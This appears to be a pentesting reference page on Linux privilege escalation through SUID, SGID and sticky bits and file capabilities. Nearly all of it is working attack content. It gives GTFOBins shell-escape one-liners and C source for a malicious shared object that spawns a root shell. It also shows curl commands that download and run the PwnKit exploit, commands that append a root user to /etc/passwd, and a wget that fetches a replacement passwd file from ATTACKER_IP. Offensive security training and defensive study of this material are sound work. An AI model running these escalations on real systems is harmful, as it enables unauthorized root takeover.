---
title: 'Special Permissions (SUID, SGID, Sticky Bit)'
description: 'Linux privilege escalation via SUID, SGID, and sticky bit — enumeration, GTFOBins exploitation, shared object hijacking, and capabilities abuse with practical command references.'
---

# Special Permissions (SUID, SGID, Sticky Bit)

Special permission bits change how binaries and directories behave. SUID and SGID binaries are among the most common privilege escalation vectors on Linux.

---

## Permission Bits Reference

| Bit | Octal | On Files | On Directories | Notation |
|:----|:------|:---------|:---------------|:---------|
| **SUID** | `4000` | Runs as the file **owner** (usually root) | — | `-rws------` (lowercase `s` = SUID + execute) |
| **SGID** | `2000` | Runs as the file **group** | New files inherit the directory's group | `-rwx--s---` |
| **Sticky** | `1000` | — | Only file owner can delete their files (e.g., `/tmp`) | `drwxrwxrwt` |

!!! tip "Capital S vs Lowercase s"
    - `s` (lowercase) = SUID/SGID **and** execute permission are set → exploitable
    - `S` (uppercase) = SUID/SGID set but **no execute** permission → not directly exploitable

---

## 1. Enumeration

### Find SUID Binaries

```bash
# SUID binaries owned by root (THE most important command)
find / -perm -4000 -type f 2>/dev/null

# With details
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Alternative
find / -perm -u=s -type f 2>/dev/null
```

### Find SGID Binaries

```bash
# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# With details
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

### Find Both SUID and SGID

```bash
find / -perm -6000 -type f 2>/dev/null
```

### Find Capabilities

Linux capabilities are a finer-grained alternative to SUID. Some capabilities grant root-equivalent powers.

```bash
# Find all binaries with capabilities set
getcap -r / 2>/dev/null
```

#### Dangerous Capabilities

| Capability | Risk | Example Exploitation |
|:-----------|:-----|:--------------------|
| `cap_setuid` | Can change UID to root | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setgid` | Can change GID | Change to root group |
| `cap_dac_override` | Bypass file read/write permissions | Read `/etc/shadow` |
| `cap_dac_read_search` | Bypass read permissions | Read any file |
| `cap_net_raw` | Raw socket access | Packet sniffing |
| `cap_sys_admin` | Mount filesystems, many admin ops | Mount host filesystem |
| `cap_sys_ptrace` | Trace/debug processes | Inject into root processes |
| `cap_fowner` | Bypass ownership checks | Modify any file |

---

## 2. GTFOBins — SUID Exploitation

[GTFOBins](https://gtfobins.github.io/) is your primary reference for exploiting SUID binaries. Always cross-reference every non-standard SUID binary you find.

### Common SUID Exploits

| Binary | SUID Exploitation | Command |
|:-------|:------------------|:--------|
| `bash` | Direct shell | `bash -p` |
| `find` | Command execution | `find . -exec /bin/bash -p \; -quit` |
| `vim` / `vi` | Shell escape | `vim -c ':!bash -p'` |
| `python` | Spawn shell | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` |
| `perl` | Spawn shell | `perl -e 'exec "/bin/bash -p";'` |
| `nmap` (old) | Interactive mode | `nmap --interactive` → `!sh` |
| `less` / `more` | Shell escape | `less /etc/passwd` → `!/bin/bash -p` |
| `cp` | Overwrite files | Copy modified `/etc/passwd` with root password |
| `mv` | Replace files | Replace SUID binary with shell |
| `env` | Spawn shell | `env /bin/bash -p` |
| `awk` | Command execution | `awk 'BEGIN {system("/bin/bash -p")}'` |
| `man` | Pager escape | `man ls` → `!/bin/bash -p` |
| `nano` | Read/write files | Read `/etc/shadow`, write to `/etc/passwd` |
| `wget` | File overwrite | Download modified `/etc/passwd` over the original |
| `pkexec` | CVE-2021-4034 | PwnKit — affects virtually all Linux distros |
| `screen` | Various | Version-specific exploits (e.g., screen 4.5.0) |
| `systemctl` | Enable service | Create malicious service unit |

!!! warning "Always Use `bash -p`"
    When exploiting SUID binaries, always use `/bin/bash -p`. The `-p` flag prevents bash from dropping elevated privileges. Without it, you'll get a normal user shell.

### Quick GTFOBins Workflow

```bash
# 1. Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. Filter out standard/known binaries
# Standard SUID binaries (usually NOT exploitable):
# /bin/mount, /bin/umount, /bin/su, /bin/ping, /usr/bin/passwd,
# /usr/bin/chsh, /usr/bin/chfn, /usr/bin/newgrp, /usr/bin/gpasswd,
# /usr/bin/sudo, /usr/lib/openssh/ssh-keysign,
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper

# 3. Check non-standard SUID binaries on GTFOBins
# https://gtfobins.github.io/#+suid

# 4. If binary isn't on GTFOBins, investigate manually
strings /path/to/suid-binary    # Look for commands called without full path
ltrace /path/to/suid-binary     # Library calls
strace /path/to/suid-binary     # System calls
```

---

## 3. Shared Object Hijacking

If a SUID binary loads a shared library from a writable location, you can replace it with a malicious one.

### Identify Loaded Libraries

```bash
# Check what shared objects a SUID binary loads
ldd /path/to/suid-binary

# Use strace to find missing/writable libraries
strace /path/to/suid-binary 2>&1 | grep -i "open\|access\|no such file"

# Check for RPATH/RUNPATH in the binary
readelf -d /path/to/suid-binary | grep -i "rpath\|runpath"
objdump -x /path/to/suid-binary | grep -i "rpath\|runpath"
```

### Exploitation

```c
// shell.c — malicious shared object
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile the malicious .so
gcc -shared -fPIC -o /writable/path/library.so shell.c

# Run the SUID binary — it loads our malicious library
/path/to/suid-binary
# → root shell
```

!!! tip "Where to Look"
    If `strace` shows the binary trying to load a `.so` from a path that doesn't exist or is writable by you, that's your injection point.

---

## 4. Known SUID Exploits

### PwnKit — CVE-2021-4034 (pkexec)

Affects virtually all Linux distributions with polkit/pkexec installed (almost all of them).

```bash
# Check if vulnerable
ls -la /usr/bin/pkexec
# If SUID and pkexec version < 0.120:
pkexec --version

# Exploit: https://github.com/ly4k/PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
# → root
```

### Screen 4.5.0

```bash
# Check screen version
screen --version
# If GNU Screen version 4.05.00:
# https://www.exploit-db.com/exploits/41154
```

### Sudo Exploits (SUID)

See the [Services & Internals](linux_services_adn_internals_enumeration.md) page for sudo CVE table (Baron Samedit, CVE-2019-14287).

---

## 5. Capabilities Exploitation

### Python with `cap_setuid`

```bash
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl with `cap_setuid`

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Vim with `cap_setuid`

```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash")'
```

### Generic Capability Exploitation

```bash
# 1. Find binaries with capabilities
getcap -r / 2>/dev/null

# 2. Check GTFOBins for the binary + capabilities section
# https://gtfobins.github.io/#+capabilities

# 3. Exploit based on the capability
```

---

## 6. SUID Binary Abuse via `/etc/passwd`

If you have a SUID binary that can **write files** (cp, mv, wget, tee, etc.):

### Add a Root User to `/etc/passwd`

```bash
# 1. Generate a password hash
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$HASH_HERE

# 2. Create the new passwd line
echo 'hacker:$1$xyz$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Switch to the new root user
su hacker
# Password: password123
# → root
```

### Overwrite `/etc/passwd` with `cp` or `wget`

```bash
# Copy current passwd, add your user, overwrite
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$xyz$HASH_HERE:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak

# If cp has SUID:
cp /tmp/passwd.bak /etc/passwd

# If wget has SUID:
# Host the modified passwd on your attacker machine
wget http://ATTACKER_IP/passwd -O /etc/passwd
```

---

## 7. Sticky Bit & SGID Directories

### Sticky Bit (`t`)

```bash
# Find sticky bit directories
find / -perm -1000 -type d 2>/dev/null

# Common: /tmp, /var/tmp
# Sticky bit = only file owner (or root) can delete files in the directory
# Not directly exploitable but good to know for file staging
```

### SGID Directories

```bash
# Find SGID directories (new files inherit group)
find / -perm -2000 -type d 2>/dev/null

# If a SGID directory belongs to a privileged group (e.g., "admin"),
# any file you create there inherits that group ownership
```

---

## Cheatsheet — SUID/Capabilities in 30 Seconds

```bash
# 1. Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. Find capabilities
getcap -r / 2>/dev/null

# 3. Check non-standard results on GTFOBins
# https://gtfobins.github.io/#+suid
# https://gtfobins.github.io/#+capabilities

# 4. Quick wins:
bash -p                                    # If bash is SUID
find . -exec /bin/bash -p \; -quit         # If find is SUID
python3 -c 'import os;os.setuid(0);os.system("bash")'  # If python has cap_setuid
```